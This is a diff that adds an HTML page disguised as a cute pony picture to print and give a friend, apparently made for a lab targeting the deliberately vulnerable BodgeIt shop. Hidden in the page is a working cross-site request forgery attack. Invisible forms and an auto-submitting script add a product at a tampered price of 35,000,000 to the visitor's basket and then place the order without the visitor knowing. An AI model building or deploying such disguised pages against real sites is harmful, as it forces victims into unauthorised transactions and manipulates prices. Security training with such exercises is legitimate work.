@@ -1,0 +1,27 @@
+<html>
+  <!-- CSRF Bestellen -->
+  <body>
+
+   
+<h1>Und noch ein wundervolles Pony. Drucke es aus und verschenke es an deine beste Freundin.</h1>
+<p><img src="http://www.cornify.com/pics/preview/Unicorn-and-Foal-Print-C10055158.jpg" alt="Pony!"></p>
+<iframe style="width: 0px; height: 0px; visibility: hidden" name="hidden"></iframe>
+<form name="csrf1" action="http://XXX.XXX.XXX.XXX:8080/bodgeit/basket.jsp" method="post" target="hidden">
+ <input type="hidden" name="productid" value="32" />
+ <input type="hidden" name="price" value="35000000.0" />
+ <input type="hidden" name="quantity" value="5" />
+</form>
+
+<form name="csrf2" action="http://XXX.XXX.XXX.XXX:8080/bodgeit/order.jsp" method="post" target="hidden">
+</form>
+
+<script>
+
+document.csrf1.submit();
+
+setTimeout(function(){document.csrf2.submit();}, 2000);
+
+</script>
+
+  </body>
+</html>
